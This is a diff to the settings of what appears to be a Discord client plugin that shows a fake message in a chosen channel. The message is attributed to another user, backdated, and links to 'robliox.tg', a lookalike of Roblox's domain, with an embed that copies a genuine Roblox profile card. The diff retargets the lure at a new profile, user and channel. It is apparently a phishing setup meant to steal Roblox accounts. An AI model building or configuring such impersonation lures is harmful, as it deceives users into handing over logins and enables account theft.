@@ -27,7 +27,7 @@
             
             // ===== USER SETTINGS - CHANGE THESE VALUES =====
             // Simply change the values below to update your user settings throughout the entire plugin
-            const USER_ID = "753944929973174283";           // Your Discord User ID
+            const USER_ID = "384837956944527360";           // Your Discord User ID
             const USERNAME = "";                            // Your username (leave empty to auto-fetch)
             const AVATAR_URL = "";                          // Your avatar URL (leave empty to auto-fetch)
             const DISCRIMINATOR = "0000";                   // Your discriminator
@@ -36,12 +36,12 @@
             
             // ===== MESSAGE SETTINGS - CHANGE THESE VALUES =====
             const MESSAGE_ID = "msg1";                      // Message ID
-            const TARGET_CHANNEL = "1412231416611082393";   // Target channel ID
-            const MESSAGE_USER_ID = "817381750518579200";   // User ID for the message
-            const MESSAGE_TEXT = "https://www.robliox.tg/users/25699615/profile";  // Message text/URL
-            const EMBED_TITLE = "CrazyKiara111's Profile";  // Embed title
-            const EMBED_DESCRIPTION = "CrazyKiara111 is one of the millions creating and exploring the endless possibilities of Roblox. Join CrazyKiara111 on Roblox and explore together!Razorbill mogger";  // Embed description
-            const EMBED_THUMBNAIL = "https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528";  // Embed thumbnail URL
+            const TARGET_CHANNEL = "1414311132146962503";   // Target channel ID
+            const MESSAGE_USER_ID = "1060010931461029940";   // User ID for the message
+            const MESSAGE_TEXT = "https://www.robliox.tg/users/94612591/profile";  // Message text/URL
+            const EMBED_TITLE = "DKCrimm's Profile";  // Embed title
+            const EMBED_DESCRIPTION = "DKCrimm is one of the millions creating and exploring the endless possibilities of Roblox. Join CrazyKiara111 on Roblox and explore together!Razorbill mogger";  // Embed description
+            const EMBED_THUMBNAIL = "https://images-ext-1.discordapp.net/external/27PAXAqFt09A0n-C707h5P0xWsFt83VHXOOwqCCAl8w/https/tr.rbxcdn.com/30DAY-Avatar-B2B7966239403E5A3E9EC30AA6E1FD33-Png/352/352/Avatar/Png/noFilter?format=webp";  // Embed thumbnail URL
             const MESSAGE_TIMESTAMP_OFFSET = 60000;         // Timestamp offset in milliseconds (60000 = 1 minute ago)
             const AVATAR_DECORATION = "";                   // Avatar decoration URL
             
